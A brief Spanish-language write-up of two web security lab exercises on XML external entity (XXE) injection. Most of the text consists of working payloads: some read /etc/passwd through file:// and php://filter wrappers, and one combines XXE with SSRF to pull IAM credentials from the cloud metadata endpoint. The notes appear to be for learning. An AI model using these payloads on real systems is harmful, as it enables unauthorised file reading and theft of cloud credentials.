
## LAB 1

Este ataque surge al poder declarar una nueva entidad en nuestro código xml. La forma básica de este ataque es la siguiente:
<!DOCTYPE foo[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
Aprovechamos el wrapper file://
Para luego llamar a la entidad xxe de la siguiente forma "&xxe;". El laboratorio quedaria de la siguiente manera:

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

Otra forma de crear una entidad para un XXE sería:

<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>

## LAB 2

En este lab explotamos un SSRF + XXE, tratamos de listar directorios y el ataque nos queda de la siguiente manera:

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo[ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

<stockCheck><productId>

&xxe;

</productId><storeId>1</storeId></stockCheck>
```

